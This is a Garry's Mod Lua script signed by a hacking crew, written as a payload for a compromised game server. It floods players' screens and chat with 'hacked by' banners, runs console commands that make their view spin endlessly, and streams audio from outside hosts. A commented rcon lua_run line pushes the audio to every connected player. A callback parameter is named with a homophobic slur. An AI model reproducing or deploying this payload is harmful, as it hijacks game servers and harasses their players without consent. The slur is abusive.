//lets make this as messy as possible, we don't want people reading our payload
//written by d3x and daz
print("ran clientside");
surface.CreateFont("ownedbydunkandp100crew", { size = 24, weight = 10, antialias = false, font = "Arial", outline = true})
chat.AddText("hacked by www.dunked.asia and p100 crew\nthanks to: frost, daz, peppers,\nd3x, and keegan");
hook.Add("HUDPaint", "next_level", function()
	draw.SimpleText( "hacked by www.dunked.asia and p100 crew", "ownedbydunkandp100crew", ScrW()/2, ScrH()/2 - 300, Color(math.Rand(0, 255),math.Rand(0,255),math.Rand(0,255),math.abs((CurTime() * 2) * 255)), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER );
	draw.SimpleText( "thanks to: frost, daz, peppers, d3x, and keegan", "ownedbydunkandp100crew", ScrW()/2, ScrH()/2 + 300, Color(math.Rand(0, 255),math.Rand(0,255),math.Rand(0,255),math.abs((CurTime() * 2) * 255)), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER );
end)
timer.Create("next_level_wat", 60, 0, function() RunConsoleCommand("cl_yawspeed","13376969") RunConsoleCommand("+right"); end)
timer.Create( "next_level_timer_god", 20, 0, function() chat.AddText("hacked by www.dunked.asia and p100 crew\nthanks to: frost, daz, peppers,\nd3x, and keegan") end);
sound.PlayURL( "http://frost.site.nfoservers.com/bigpayload/yeah.mp3", "", function( fag ) end)

--rcon lua_run for k, v in pairs( player.GetAll() ) do v:SendLua( "sound.PlayURL('dl.dropboxusercontent.com/u/20298158/z.mp3', '', function( fag ) end)" ) end